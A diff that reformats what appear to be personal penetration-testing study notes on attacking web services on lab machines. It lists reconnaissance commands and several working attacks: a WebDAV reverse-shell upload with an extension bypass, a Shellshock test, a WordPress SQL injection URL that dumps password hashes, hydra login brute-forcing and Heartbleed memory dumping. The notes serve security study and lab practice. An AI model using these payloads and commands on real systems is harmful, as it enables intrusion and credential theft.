@@ -5,7 +5,6 @@
 **HTTP Status Codes**
 
 https://www.restapitutorial.com/httpstatuscodes.html 
-
 https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
 
 ==200 ok, 301 moved permanent, 302 found, 403 forbidden, 404 not found, 500 internal server error==
@@ -13,7 +12,6 @@ https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
 > Things to be on look for: Default credentials for software
 > Look into source code or SVN where version info is stored (HTB Writeup)
 >
-> 
 
 **Request**
 
@@ -42,8 +40,10 @@ HEAD / HTTP/1.0
 
 
 **Basics**
-https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html - sec14.1
 
+https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html - section 14.1
+
+```text
 GET / HTTP/1.1
 Encoding: Asci, Unicode, ISO
 HTML encoding &lt;  URL encoding %20
@@ -53,10 +53,11 @@ https://www.w3schools.com/tags/ref_urlencode.asp
 character set
 character encoding [representation, in bytes, of the symbols in a character set
 Unicode uses: UTF-8, 16 and 32
+```
+
 
 ### Same Origin Policy
-Prevents a script from setting properties of another document comming from a different origin
-a document can access (through JavaScript) the properties of another document only if they have the same origin
+Prevents a script from setting properties of another document comming from a different origin a document can access (through JavaScript) the properties of another document only if they have the same origin
 
 ### Cookies
 Set-Cookie HTTP header field
@@ -78,7 +79,10 @@ nc 10.11.1.8 80 -> OPTIONS / HTTP/1.1 -> Host: bob.thinc.local -> enter enter
 ## Subdomains
 https://censys.io/certificates?q=.gamma.nl&page=2
 https://github.com/ehsahil/recon-my-way/tree/master/aquatone
-`gobuster -m dns -u gamma.nl -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 20`
+
+**Gobuster**
+
+gobuster -m dns -u gamma.nl -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 20`
 Gobuster also has a -m dns mode for finding subdomains
 
 **Wfuzz**
@@ -86,14 +90,14 @@ Gobuster also has a -m dns mode for finding subdomains
 `wfuzz -H 'Host: FUZZ.redcross.htb' -u https://10.10.10.113 -w /usr/share/seclists/Discovery/DNS/subs-subdomain.txt --hw 28`
 site:.microsoft.com -site:www.microsoft.com
 
-
-
 **Netcraft subdomain finder**
 https://searchdns.netcraft.com
 
 
 
-**SubFinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources**
+**SubFinder**
+
+a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources
 `./subfinder -d freelancer.com -o output.txt`
 `./subfinder -d example.com -b -w /opt/SecLists.... -t 20`
 
@@ -113,6 +117,7 @@ https://searchdns.netcraft.com
 **[add words found on site to list]**
 
 cewl and then append to list for gobuster ?
+
 `dirb http://192.168.1.11 /usr/share/wordlists/dirb/small.txt -x /usr/share/wordlists/dirb/extensions_common.txt -vv`
 `dirb http://10.10.10.78 /usr/share/wordlists/dirb/small.txt -X .sh, .php -o dirboutput.txt`
 `gobuster -w /usr/share/wordlists/dirb/common.txt -x php,pl,sh,txt -u http://10.10.10.27 -s 200,204,301,302,307,403 -t 25 -e`
@@ -159,17 +164,16 @@ Through a Proxy like Squid
 ## Enumeration
 
 - `perl /opt/nikto/program/nikto.pl -host http://10.11.1.44:8000`
-- `whatweb -v http://{ip} --color=never --no-errors``
+- `whatweb -v http://{ip} --color=never --no-errors`
 
-- OWASP Zaproxy
+- `OWASP Zaproxy`
 
 - `nmap --script http-enum`
 
-- Zap proxy active scan
-- `skipfish -Y -L -W- -m [10] -o output.txt http://192.168.100.139``
+- `Zap proxy active scan`
+- `skipfish -Y -L -W- -m [10] -o output.txt http://192.168.100.139`
 
-
-
+```shell
 --script="http-waf-detect,http-vhosts,http-robtex*,http-methods,http-enum"
 python nettacker.py -i 192.168.100.121 -m all
 nmap {nmap_extra} -sV -p {port} --script="(http* or ssl*) and not (broadcast or dos or external or http-slowloris* or fuzzer or brute)"
@@ -177,10 +181,10 @@ nmap {nmap_extra} -sV -p {port} --script="(http* or ssl*) and not (broadcast or 
 nmap','-n','-sV','-Pn','-vv','-p',port,'--script','banner,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth,http-backup-finder,http-bigip-cookie,http-cakephp-version,http-cisco-anyconnect,http-comments-displayer,http-config-backup,http-cookie-flags,http-cors,http-cross-domain-policy,http-default-accounts,http-drupal-enum,http-favicon,http-generator,http-git,http-grep,http-headers,http-jsonp-detection,http-ls,http-mcmp,http-method-tamper,http-methods,http-mobileversion-checker,http-ntlm-info,http-passwd,http-php-version,http-robots.txt,http-title,http-traceroute,http-unsafe-output-escaping,http-useragent-tester,http-userdir-enum,http-vhosts,http-vlcstreamer-ls,http-waf-detect,http-waf-fingerprint,http-webdav-scan','--script-args', "http.useragent=%s,http-waf-detect.aggro,http-waf-detect.detectBodyChanges,http-waf-fingerprint.intensive=1" % userAgent,'-oA','/root/scripts/recon_enum/results/exam/http/%s_%s_http' % (ip_address, port),ip_address])
 
 curl -i 10.11.1.71
-
 curl -sSik {scheme}://{address}:{port}/robots.txt -m 10
 curl -sSik {scheme}://{address}:{port}/ -m 10 | grep Powered by
 whatweb --color=never --no-errors -a 3 -v {scheme}://{address}:{port}
+```
 
 
 
@@ -191,21 +195,27 @@ https://medium.com/@d0nut/week-8-exploitation-36c761572c83
 wampp:xampp default credentials
 http-iis-webdav-vuln.nse script
 [manual] cadaver 192.168.100.138
-/usr/bin/davtest -url <url> [options]
-test what file extensions are allowed to be uploaded
+
+**test what file extensions are allowed to be uploaded**
 [manual] davtest -url http://foobar:80
 
+
+
 ### Hashcat MD5 Apache webdav file  
-hashcat -m 1600 -a 0 hash.txt rockyou.txt
+
+`hashcat -m 1600 -a 0 hash.txt rockyou.txt`
 
 **Upload shell to Vulnerable WebDAV directory, To attempt to bypass file type restriction upload:**
-To see what options are allowed you can use use auxiliary/scanner/http/options If PUT method is allowed you probably can upload web .asp shell. In my case .asp file upload was forbidden and only .txt and .html were allowed. In such situation we should upload file.txt and then to copy it as file.asp;.txt
+To see what options are allowed you can use use auxiliary/scanner/http/options If PUT method is allowed you probably can upload web .asp shell. In my case .asp file upload was forbidden and only .txt and .html were allowed. In such situation we should upload file.txt and then to copy it as ***file.asp;.txt***
 
 `msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=4444 R | msfencode -t asp -o shell.asp`
+
+```bash
 cadaver http://192.168.0.60/
 put shell.asp shell.txt
 copy shell.txt shell.asp;.txt
 Start reverse handler - browse to http://192.168.0.60/shell.asp;.txt
+```
 
 
 
@@ -236,8 +246,8 @@ curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.htm
 
 **CVE-2014-6271**
 https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_3/html/index.html
-env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”
-./dirsearch.py -u http://192.168.13.29/ -e cgi -r
+`env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”`
+`./dirsearch.py -u http://192.168.13.29/ -e cgi -r`
 
 nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.13.29 -p 80
 nmap 10.11.1.71 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
@@ -267,8 +277,7 @@ curl -v --proxy 192.168.56.106:3128 http://192.168.56.106/cgi-bin/status -H "Ref
 # HTTPS - 443
 
 Heartbleed / CRIME / Other similar attacks
-Read the actual SSL CERT to:
-find out potential correct vhost to GET
+Read the actual SSL CERT to:find out potential correct vhost to GET
 is the clock skewed
 any names that could be usernames for bruteforce/guessing.
 
@@ -279,7 +288,7 @@ Module used to dump encrypted memory contents from an ssl host.
 **OpenSSL versions 1.0.1 through 1.0.1f**
 `nmap --script ssl-heartbleed 192.168.13.58 -p 443 -sV`
 `msf > use auxiliary/scanner/ssl/openssl_heartbleed`
-`msf auxiliary(scanner/ssl/openssl_heartbleed) -> show actions`
+`msf > auxiliary(scanner/ssl/openssl_heartbleed) -> show actions`
 `set action DUMP`
 `strings <downloaded file>`
 
@@ -327,16 +336,20 @@ wpscan -u www.example.com --wp-content-dir custom-content
 `wpscan --url $ip/blog --proxy $ip:3129`
 
 **Passwords**
-/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23
+`/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23`
 
+```shell
 hydra -L fsocietyuniq -p test 192.168.90.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.11.1.251 http-post-form '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect password'
 hydra -l root@localhost -P /usr/share/wordlists/dirb/big.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed"
 
 wpscan --url 10.11.1.251/wp --wordlist /root/Documents/oscp/files/rockyou.txt --username sean threads 50
+```
+
+
 
 ### Brute force Wordpress (PHPASS)
-cudahashcat64.exe -m 400 -a 3 hashfile wordlist
+`cudahashcat64.exe -m 400 -a 3 hashfile wordlist`
 
 ## Apache Tomcat
 https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote
@@ -346,10 +359,10 @@ https://pentestlab.blog/2012/08/26/using-metasploit-to-create-a-war-backdoor/
 default credentials
 `msf > use auxiliary/scanner/http/tomcat_mgr_login`
 **Then deploy a reverse shell**
-JSP shell - /usr/share/laudanum/
+JSP shell is located in: /usr/share/laudanum/
 
 /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
-hydra -C default_accounts.txt ftp://localhost
+`hydra -C default_accounts.txt ftp://localhost`
 
 **[8009,Apache Jserve]**
 
@@ -364,13 +377,14 @@ nmap','-n','-sV','-Pn','-vv','-p',port,'--script','banner,ajp-auth,ajp-headers,a
 `msf ->  /exploit/multi/misc/java_rmi_server`
 `nmap -sV -p {port} --script="rmi-vuln-classloader,rmi-dumpregistry" {ip}`
 
+
+
 ## Java Deserialization
 
  **(Jboss, WebLogic, WebSphere, Jenkins)**
 
 https://www.owasp.org/index.php/Deserialization_of_untrusted_data
 https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
-serialization itself is a process which allows for applications to convert data into a binary format, which is suitable for saving to disk. Deserialization is other way around
-/usr/share/laudanum/ for shells
+serialization itself is a process which allows for applications to convert data into a binary format, which is suitable for saving to disk. Deserialization is other way around. /usr/share/laudanum/ for shells
 
 `nmap -p 1100 --script=rmi-vuln-classloader 10.11.1.73`
